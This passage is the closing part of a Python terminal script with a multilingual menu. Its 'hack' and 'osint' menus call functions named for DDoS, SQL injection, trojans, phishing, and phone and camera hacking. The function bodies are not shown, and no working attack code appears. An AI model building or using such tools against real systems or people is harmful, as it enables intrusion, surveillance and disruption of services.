            funcs[int(c) - 1]()
        except (ValueError, IndexError):
            pass

def main():
    if "--selftest" in sys.argv:
        selftest()
        return
    if not PLAIN:
        sys.stdout.write("\033[?1049h\033[?25l\033[2J")
    try:
        pick_language()
        boot()
        while True:
            screen_menu(t("main"), [("1", t("m1")), ("2", t("m2")), ("0", t("m0"))])
            c = ask(t("choice"))
            if c == "1":
                menu(t("hack"), [t(f"h{i}") for i in range(1, 10)],
                     [cmd_ddos, cmd_dos, cmd_ddos_rootkit, cmd_sqli, cmd_trojan, cmd_inject,
                      cmd_goat, cmd_webhack, cmd_killweb])
            elif c == "2":
                menu(t("osint"), [t(f"o{i}") for i in range(1, 10)],
                     [cmd_phone, cmd_iptrace, cmd_name, cmd_id, cmd_phish,
                      cmd_cam, cmd_phonehack, cmd_camwifi, cmd_wifi])
            elif c.lower() == "l":
                pick_language()
            elif c in ("0", "q"):
                break
    finally:
        sys.stdout.write("\033[?25h\033[0m\033[?1049l")
        print(HI + BOLD + "\n   " + t("bye") + "\n" + R)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.stdout.write("\033[?25h\033[0m\033[?1049l")
        print(RD + "  " + t("bye") + R)